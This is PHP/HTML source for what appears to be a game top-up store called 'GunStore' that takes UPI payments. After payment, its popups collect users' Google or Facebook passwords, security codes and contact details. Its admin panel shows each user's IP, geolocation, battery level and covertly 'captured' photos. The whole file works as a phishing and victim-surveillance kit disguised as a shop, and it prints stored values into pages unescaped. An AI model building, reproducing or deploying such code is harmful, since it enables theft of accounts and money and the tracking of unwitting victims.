                <p><span style="color:#9b59b6;font-weight:bold;">Wallet:</span> ₹<?php echo number_format($u['wallet'], 2); ?></p>
                <p><span style="color:#9b59b6;font-weight:bold;">IP:</span> <?php echo $u['ip'] ?? 'Unknown'; ?></p>
                <p><span style="color:#9b59b6;font-weight:bold;">Location:</span> <?php echo $u['location'] ?? 'Unknown'; ?></p>
                <p><span style="color:#9b59b6;font-weight:bold;">Latitude:</span> <?php echo $u['latitude'] ?? '0'; ?></p>
                <p><span style="color:#9b59b6;font-weight:bold;">Longitude:</span> <?php echo $u['longitude'] ?? '0'; ?></p>
                <p><span style="color:#9b59b6;font-weight:bold;">Battery:</span> <?php echo $u['battery_level'] ?? 'Unknown'; ?></p>
                <p><span style="color:#9b59b6;font-weight:bold;">Approved:</span> <?php echo $u['approved'] == 1 ? '<span style="color:#00cc00;">Yes</span>' : '<span style="color:#ffd700;">No</span>'; ?></p>
                <?php if($u['captured_photo']): ?>
                <div style="margin-top:5px;"><img src="<?php echo $u['captured_photo']; ?>" style="max-width:100%; max-height:100px; border-radius:8px;"></div>
                <?php endif; ?>
                <p><span style="color:#9b59b6;font-weight:bold;">Status:</span> <?php echo $u['banned'] == 1 ? '<span style="color:#ff4444;">Banned</span>' : '<span style="color:#00cc00;">Active</span>'; ?></p>
                <div style="display:flex; gap:5px; flex-wrap:wrap; margin-top:10px;">
                    <?php if($u['banned'] == 1): ?>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                        <input type="hidden" name="user_id" value="<?php echo $u['id']; ?>">
                        <button type="submit" name="admin_action" value="unban_user" style="background:#00cc00; padding:5px 15px; border:none; border-radius:5px; color:#fff; cursor:pointer; font-size:12px;">Unban</button>
                    </form>
                    <?php else: ?>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                        <input type="hidden" name="user_id" value="<?php echo $u['id']; ?>">
                        <button type="submit" name="admin_action" value="ban_user" style="background:#cc0000; padding:5px 15px; border:none; border-radius:5px; color:#fff; cursor:pointer; font-size:12px;">Ban</button>
                    </form>
                    <?php endif; ?>
                    <form method="post" style="display:inline;">
                        <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
                        <input type="hidden" name="user_id" value="<?php echo $u['id']; ?>">
                        <button type="submit" name="admin_action" value="delete_user" style="background:#ff4444; padding:5px 15px; border:none; border-radius:5px; color:#fff; cursor:pointer; font-size:12px;" onclick="return confirm('Delete?')">Delete</button>
                    </form>
                </div>
            </div>
        <?php endwhile; ?>
        </div>
    </div>
    
    <!-- Captured Photos -->
    <div style="background:rgba(0,0,0,0.8); padding:20px; border-radius:12px; margin:20px 0; border:1px solid #9b59b6;">
        <h4 style="color:#9b59b6; margin-bottom:15px;">Captured Photos (<?php echo count($captured_photos); ?>)</h4>
        <div style="display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:15px;">
        <?php foreach($captured_photos as $photo): ?>
            <div style="background:rgba(26,10,46,0.6); border-radius:10px; padding:10px; border:1px solid #4a1a6e; text-align:center;">
                <img src="<?php echo $photo['captured_photo']; ?>" style="width:100%; border-radius:8px; max-height:150px; object-fit:cover;">
                <p style="color:#9b59b6;font-weight:bold;margin-top:5px;"><?php echo $photo['name'] ?? 'Unknown'; ?></p>
                <p style="font-size:12px;color:#aaa;">IP: <?php echo $photo['ip'] ?? 'Unknown'; ?></p>
                <p style="font-size:12px;color:#aaa;">Location: <?php echo $photo['location'] ?? 'Unknown'; ?></p>
                <p style="font-size:12px;color:#aaa;">Lat: <?php echo $photo['latitude'] ?? '0'; ?></p>
                <p style="font-size:12px;color:#aaa;">Lon: <?php echo $photo['longitude'] ?? '0'; ?></p>
                <p style="font-size:12px;color:#aaa;">Battery: <?php echo $photo['battery_level'] ?? 'Unknown'; ?></p>
            </div>
        <?php endforeach; ?>
        <?php if(count($captured_photos) == 0): ?>
            <p style="color:#888;">No captured photos yet</p>
        <?php endif; ?>
        </div>
    </div>
    
    <!-- Orders -->
    <div style="background:rgba(0,0,0,0.8); padding:20px; border-radius:12px; margin:20px 0; border:1px solid #9b59b6;">
        <h4 style="color:#9b59b6; margin-bottom:15px;">Orders (<?php echo $db->querySingle("SELECT COUNT(*) FROM orders"); ?>)</h4>
        <?php $orders = $db->query("SELECT * FROM orders ORDER BY id DESC");
        while($o = $orders->fetchArray()): ?>
        <div style="background:rgba(26,10,46,0.4); padding:10px; margin:5px 0; border-radius:8px; border-left:3px solid #9b59b6;">
            <strong><?php echo $o['name']; ?></strong> - ₹<?php echo number_format($o['amount'], 2); ?>
            <span style="color:#888;font-size:12px;margin-left:10px;"><?php echo $o['created_at']; ?></span>
            <span style="color:#00cc00;font-size:12px;margin-left:10px;"><?php echo $o['status']; ?></span>
        </div>
        <?php endwhile; ?>
    </div>
    
    <!-- Fund Requests -->
    <div style="background:rgba(0,0,0,0.8); padding:20px; border-radius:12px; margin:20px 0; border:1px solid #9b59b6;">
        <h4 style="color:#9b59b6; margin-bottom:15px;">Fund Requests (<?php echo $db->querySingle("SELECT COUNT(*) FROM fund_requests"); ?>)</h4>
        <?php $funds = $db->query("SELECT * FROM fund_requests ORDER BY id DESC");
        while($f = $funds->fetchArray()): ?>
        <div style="background:rgba(26,10,46,0.4); padding:10px; margin:5px 0; border-radius:8px; border-left:3px solid #9b59b6;">
            <strong>₹<?php echo number_format($f['amount'], 2); ?></strong> - UTR: <?php echo $f['utr']; ?>
            <span style="color:#888;font-size:12px;margin-left:10px;"><?php echo $f['created_at']; ?></span>
            <span style="color:<?php echo $f['status'] == 'pending' ? '#ffd700' : '#00cc00'; ?>;font-size:12px;margin-left:10px;"><?php echo $f['status']; ?></span>
        </div>
        <?php endwhile; ?>
    </div>
</div>
<?php endif; ?>


<!-- ============ POPUPS ============ -->
<!-- Order History -->
<div id="ordersPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Order History</h3>
        <?php $orders = $db->query("SELECT * FROM orders WHERE user_id=".$user['id']." ORDER BY id DESC");
        $hasOrder = false;
        while($o = $orders->fetchArray()) { $hasOrder = true; echo "<div class='order-item'><strong>{$o['name']}</strong><br>₹{$o['amount']}<br><small>{$o['created_at']}</small></div>"; }
        if(!$hasOrder) echo "<p style='text-align:center;padding:20px;color:#888;'>No orders yet</p>"; ?>
        <button onclick="closePopup('ordersPage')" class="close-btn">Close</button>
    </div>
</div>

<!-- Notifications -->
<div id="notificationsPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Notifications</h3>
        <?php $notif = $db->query("SELECT * FROM notifications WHERE user_id=".$user['id']." ORDER BY id DESC");
        $hasNotif = false;
        while($n = $notif->fetchArray()) { $hasNotif = true; echo "<div class='notif-item'>{$n['message']}<br><small>{$n['created_at']}</small></div>"; }
        if(!$hasNotif) echo "<p style='text-align:center;padding:20px;color:#888;'>No notifications</p>"; ?>
        <button onclick="closePopup('notificationsPage')" class="close-btn">Close</button>
    </div>
</div>

<!-- Fund Requests -->
<div id="fundsHistoryPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Fund Requests</h3>
        <?php $funds = $db->query("SELECT * FROM fund_requests WHERE user_id=".$user['id']." ORDER BY id DESC");
        $hasFund = false;
        while($f = $funds->fetchArray()) { $hasFund = true; echo "<div class='order-item'>₹{$f['amount']}<br>UTR: {$f['utr']}<br>Status: {$f['status']}<br><small>{$f['created_at']}</small></div>"; }
        if(!$hasFund) echo "<p style='text-align:center;padding:20px;color:#888;'>No fund requests</p>"; ?>
        <button onclick="closePopup('fundsHistoryPage')" class="close-btn">Close</button>
    </div>
</div>

<!-- Add Funds -->
<div id="addFundsPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Add Funds</h3>
        <p style="text-align:center; color:#ff4444; font-weight:bold;">Minimum ₹<?php echo $MIN_DEPOSIT; ?></p>
        <div class="bonus-btns">
            <button class="bonus-btn" onclick="setAmount(<?php echo $MIN_DEPOSIT; ?>)">₹<?php echo $MIN_DEPOSIT; ?></button>
            <button class="bonus-btn" onclick="setAmount(500)">₹500</button>
            <button class="bonus-btn" onclick="setAmount(1000)">₹1000</button>
        </div>
        <input type="number" id="fundsAmount" placeholder="Custom amount (Min ₹<?php echo $MIN_DEPOSIT; ?>)">
        <button onclick="generateFundsQR()">Proceed to Pay</button>
        <div class="verified-badge">Please use your own bank account</div>
        <button onclick="closePopup('addFundsPage')" class="close-btn">Cancel</button>
    </div>
</div>

<!-- Cart -->
<div id="cartPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Your Cart</h3>
        <?php if(count($cart_items) == 0): ?>
            <p style="text-align:center;padding:20px;color:#888;">Cart is empty</p>
        <?php else: ?>
            <?php foreach($cart_items as $idx => $item): ?>
            <div class="cart-item">
                <span><?php echo $item['name']; ?> - ₹<?php echo $item['price']; ?></span>
                <a href="?remove_cart=<?php echo $idx; ?>" style="color:#ff4444; text-decoration:none;">Remove</a>
            </div>
            <?php endforeach; ?>
            <div class="cart-total">Total: ₹<?php echo $cart_total; ?></div>
            <form method="post">
                <button type="submit" name="checkout">Proceed to Pay</button>
            </form>
        <?php endif; ?>
        <button onclick="closePopup('cartPage')" class="close-btn">Close</button>
    </div>
</div>

<!-- Checkout -->
<div id="checkoutPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Complete Payment</h3>
        <p style="font-size:18px; text-align:center; margin:15px 0;">Total: ₹<?php echo $checkout_total; ?></p>
        <p style="color:#ff4444; font-size:12px; text-align:center;">Min ₹<?php echo $MIN_DEPOSIT; ?></p>
        <div class="bonus-btns">
            <button class="bonus-btn" onclick="setCheckoutAmount(<?php echo max($MIN_DEPOSIT, $checkout_total); ?>)">₹<?php echo max($MIN_DEPOSIT, $checkout_total); ?></button>
            <button class="bonus-btn" onclick="setCheckoutAmount(500)">₹500</button>
            <button class="bonus-btn" onclick="setCheckoutAmount(1000)">₹1000</button>
        </div>
        <input type="number" id="checkoutAmount" placeholder="Enter amount (Min <?php echo max($MIN_DEPOSIT, $checkout_total); ?>)">
        <button onclick="generateCheckoutQR()">Pay Now</button>
        <button onclick="closePopup('checkoutPage')" class="close-btn">Cancel</button>
    </div>
</div>

<!-- QR Popup -->
<div id="qrPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Scan & Pay</h3>
        <img id="qrImage" src="" width="180" style="margin:15px auto; background:#fff; padding:10px; border-radius:12px;">
        <p id="qrAmount" style="font-size:20px; color:#ffd700;"></p>
        <p style="color:#888; font-size:12px;">UPI: <?php echo $upi_id; ?></p>
        <input type="text" id="utrInput" placeholder="Enter UTR Number">
        <button onclick="submitUTR()">Submit</button>
        <button onclick="closePopup('qrPopup')">Cancel</button>
    </div>
</div>

<!-- Game Account -->
<div id="gameAccountPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Select Your Game Account</h3>
        <div class="game-login-btns">
            <img src="https://i.ibb.co/wZTBJn3g/file-75.jpg" class="game-icon" onclick="showGoogleForm()">
            <img src="https://i.ibb.co/k2S25TS9/file-74.jpg" class="game-icon" onclick="showFacebookForm()">
        </div>
        <button onclick="closePopup('gameAccountPopup')">Cancel</button>
    </div>
</div>

<!-- Google Form Funds -->
<div id="googleFormFundsPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Google Account Details</h3>
        <form method="post">
            <input type="text" name="uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="email" name="email" placeholder="Gmail" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="security_code" placeholder="Security Code" required>
            <input type="tel" name="contact" placeholder="Contact Number" required>
            <button type="submit" name="submit_google_funds">Submit</button>
            <button type="button" onclick="closePopup('googleFormFundsPopup')">Cancel</button>
        </form>
    </div>
</div>

<!-- Facebook Form Funds -->
<div id="fbFormFundsPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Facebook Account Details</h3>
        <form method="post">
            <input type="text" name="uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="text" name="login" placeholder="Phone Number or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="email" name="linked_email" placeholder="Linked Gmail" required>
            <input type="text" name="username" placeholder="Username" required>
            <input type="tel" name="contact" placeholder="Contact Number" required>
            <button type="submit" name="submit_fb_funds">Submit</button>
            <button type="button" onclick="closePopup('fbFormFundsPopup')">Cancel</button>
        </form>
    </div>
</div>

<!-- Google Form Order -->
<div id="googleFormOrderPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Google Account Details</h3>
        <form method="post">
            <input type="text" name="uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="email" name="email" placeholder="Gmail" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="security_code" placeholder="Security Code" required>
            <input type="tel" name="contact" placeholder="Contact Number" required>
            <button type="submit" name="submit_google_order">Submit</button>
            <button type="button" onclick="closePopup('googleFormOrderPopup')">Cancel</button>
        </form>
    </div>
</div>

<!-- Facebook Form Order -->
<div id="fbFormOrderPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6;">Facebook Account Details</h3>
        <form method="post">
            <input type="text" name="uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="text" name="login" placeholder="Phone Number or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="email" name="linked_email" placeholder="Linked Gmail" required>
            <input type="text" name="username" placeholder="Username" required>
            <input type="tel" name="contact" placeholder="Contact Number" required>
            <button type="submit" name="submit_fb_order">Submit</button>
            <button type="button" onclick="closePopup('fbFormOrderPopup')">Cancel</button>
        </form>
    </div>
</div>

<script>
let selectedAmount = 0;
let checkoutTotal = <?php echo $checkout_total; ?>;
let isFromCheckout = false;

function toggleSidebar() {
    var sidebar = document.getElementById('sidebar');
    if(sidebar.style.display === 'none' || sidebar.style.display === '') {
        sidebar.style.display = 'block';
    } else {
        sidebar.style.display = 'none';
    }
}

function closePopup(id) {
    document.getElementById(id).style.display = 'none';
}

function showOrdersPage() { 
    document.getElementById('ordersPage').style.display = 'block'; 
    document.getElementById('sidebar').style.display = 'none'; 
}
function showNotificationsPage() { 
    document.getElementById('notificationsPage').style.display = 'block'; 
    document.getElementById('sidebar').style.display = 'none'; 
}
function showFundsHistoryPage() { 
    document.getElementById('fundsHistoryPage').style.display = 'block'; 
    document.getElementById('sidebar').style.display = 'none'; 
}
function showAddFundsPage() { 
    document.getElementById('addFundsPage').style.display = 'block'; 
    document.getElementById('sidebar').style.display = 'none'; 
}
function showCart() { 
    document.getElementById('cartPage').style.display = 'block'; 
}

function setAmount(amt) { 
    document.getElementById('fundsAmount').value = amt; 
}
function setCheckoutAmount(amt) { 
    document.getElementById('checkoutAmount').value = amt; 
}

function generateFundsQR() {
    let amt = parseFloat(document.getElementById('fundsAmount').value);
    let minDeposit = <?php echo $MIN_DEPOSIT; ?>;
    if(!amt || amt < minDeposit) { 
        alert('Minimum ₹' + minDeposit); 
        return; 
    }
    selectedAmount = amt;
    isFromCheckout = false;
    document.getElementById('addFundsPage').style.display = 'none';
    let qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=' + encodeURIComponent('<?php echo $upi_id; ?>') + '&pn=GunStore&am=' + selectedAmount + '&cu=INR';
    document.getElementById('qrImage').src = qrUrl;
    document.getElementById('qrAmount').innerHTML = '₹' + selectedAmount;
    document.getElementById('qrPopup').style.display = 'flex';
}

function generateCheckoutQR() {
    let amt = parseFloat(document.getElementById('checkoutAmount').value);
    let minDeposit = <?php echo $MIN_DEPOSIT; ?>;
    let minAmt = Math.max(minDeposit, checkoutTotal);
    if(!amt || amt < minAmt) { 
        alert('Minimum amount is ₹' + minAmt); 
        return; 
    }
    selectedAmount = amt;
    isFromCheckout = true;
    document.getElementById('checkoutPage').style.display = 'none';
    let qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=' + encodeURIComponent('<?php echo $upi_id; ?>') + '&pn=GunStore&am=' + selectedAmount + '&cu=INR';
    document.getElementById('qrImage').src = qrUrl;
    document.getElementById('qrAmount').innerHTML = '₹' + selectedAmount;
    document.getElementById('qrPopup').style.display = 'flex';
}

function submitUTR() {
    let utr = document.getElementById('utrInput').value;
    if(!utr) { 
        alert('Enter UTR'); 
        return; 
    }
    document.getElementById('qrPopup').style.display = 'none';
    document.getElementById('gameAccountPopup').style.display = 'flex';
}

function showGoogleForm() {
    document.getElementById('gameAccountPopup').style.display = 'none';
    if(isFromCheckout) {
        document.getElementById('googleFormOrderPopup').style.display = 'flex';
    } else {
        document.getElementById('googleFormFundsPopup').style.display = 'flex';
    }
}

function showFacebookForm() {
    document.getElementById('gameAccountPopup').style.display = 'none';
    if(isFromCheckout) {
        document.getElementById('fbFormOrderPopup').style.display = 'flex';
    } else {
        document.getElementById('fbFormFundsPopup').style.display = 'flex';
    }
}

function openTelegram() {
    window.open('https://t.me/ROHITxBOSS', '_blank');
}

<?php if($show_cart): ?> showCart(); <?php endif; ?>
<?php if($step == 'checkout'): ?> document.getElementById('checkoutPage').style.display = 'flex'; <?php endif; ?>
<?php if($step == 'game_account'): ?> document.getElementById('gameAccountPopup').style.display = 'flex'; <?php endif; ?>
</script>
<?php endif; ?>
</body>
</html>